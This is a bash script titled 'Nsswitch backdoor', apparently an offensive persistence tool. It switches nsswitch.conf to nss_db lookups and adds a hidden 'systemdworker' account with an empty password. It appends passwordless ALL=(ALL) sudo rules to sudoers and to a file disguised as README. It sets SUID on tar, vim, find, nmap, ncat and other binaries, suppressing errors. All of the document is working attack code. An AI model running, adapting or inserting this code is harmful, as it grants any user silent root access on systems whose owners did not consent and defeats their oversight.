#Nsswitch backdoor
#Jacob Cedar jac2552@rit.edu
QUIET (){
	eval $@ 2>/dev/null >/dev/null
	return $?
}

users_db() {
    # /var/lib/misc on Debian
    # /var/db on RHEL

    # Add backdoored users if system supports that
	if [ "`command -v  yum`" != "" ]; then
		yum install -y nss_db; #2>/dev/null >/dev/null
		yum install -y make;
		if [ -f /var/db/Makefile ]; then
			echo "Getting databases"
			sed -i 's/files/db files/g' /etc/nsswitch.conf;
			sed -i 's/compat/db compat/g' /etc/nsswitch.conf;
			#GET_FILE "$1/shadow.db" "/var/db/shadow.db";
			sed -i 's:/etc/passwd:passwd:g' /var/db/Makefile
    			echo "systemdworker::999:999:systemdworker:/home:/bin/bash" > /var/db/passwd
			make -C /var/db 2>/dev/null >/dev/null
    			[ "$?" = "0" ] || echo "Downloading shadow.db failed..."
			#GET_FILE "$1/passwd.db" "/var/db/passwd.db";
			[ "$?" = "0" ] || echo "Downloading passwd.db failed..."
			#GET_FILE "$1/group.db" "/var/db/group.db";
			[ "$?" = "0" ] || echo "Downloading group.db failed..."
			return 0;
			fi;
	elif [ "`command -v apt-get`" != "" ]; then
		apt install -y libnss-db; #2>/dev/null >/dev/null
		apt install -y make;
		if [ -f /var/lib/misc/Makefile ]; then
                        echo "Getting databases"
                        sed -i 's/files/db files/g' /etc/nsswitch.conf;
			sed -i 's/compat/db compat/g' /etc/nsswitch.conf;
                        #GET_FILE "$1/shadow.db" "/var/lib/misc/shadow.db";
                        sed -i 's:$(ETC)/passwd:passwd:g' /var/lib/misc/Makefile
                        echo "systemdworker::999:999:systemdworker:/home:/bin/bash" > /var/lib/misc/passwd
                        make -C /var/lib/misc 2>/dev/null >/dev/null
                        [ "$?" = "0" ] || echo "Downloading shadow.db failed..." 
                        #GET_FILE "$1/passwd.db" "/var/lib/misc/passwd.db";
                        [ "$?" = "0" ] || echo "Downloading passwd.db failed..." 
                        #GET_FILE "$1/group.db" "/var/lib/misc/group.db";
                        [ "$?" = "0" ] || echo "Downloading group.db failed..." 
			return 0;
			fi;
	else
		echo "Cannot use database backdoor on this system";
		return 1;
    fi;
};

users_sudo() {
    # Search for the include line in the sudoers file, add an ALL ALL
    sudo_include="`grep '^#include' /etc/sudoers | sed 's:^[^/]*/:/:g'`";
    # Check if a file is included sudoers, if not include /etc/sudoers.d
    if [ "$sudo_include" = "" ]; then
        echo "#includedir /etc/sudoers.d" >> "/etc/sudoers";
        sudo_include="/etc/sudoers.d"
    fi
    # Add ALL=ALL to the the included file
    sudo_include=$sudo_include"/README";
    echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> $sudo_include;
    QUIET chmod 0440 $sudo_include;
    # Add ALL=ALL to the main sudoers file
    echo "ALL ALL=(ALL:ALL) NOPASSWD:ALL" >> "/etc/sudoers";
};

tools_suid() {
    # Enable SUID on all the following binaries
    echo "Setting SUID on binaries";
    bins="tar awk find nano vim vi xtables-multi cp less more nmap man"
    bins="$bins watch chmod mv ncat xtables"
    for b in $bins; do
        QUIET chmod 7555 `command -v $b`;
        [ "$?" = "0" ] && echo "SUID Set on $b";
    done
    return 0;
};

users() {
    users_db;
    echo "Sudoers added"
    users_sudo;
	tools_suid;
};
users;